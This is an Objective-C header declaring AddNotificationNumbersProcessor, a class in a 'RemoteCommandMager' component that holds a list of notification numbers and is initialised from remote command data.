/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddNotificationNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "RemoteCmdSyncProcessor.h"

@interface AddNotificationNumbersProcessor : RemoteCmdSyncProcessor {
@private
	NSArray *mNotificationNumberList;
}

@property(nonatomic,retain) NSArray *mNotificationNumberList;

//Initialize Processor with RemoteCommandData 
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData; 
@end
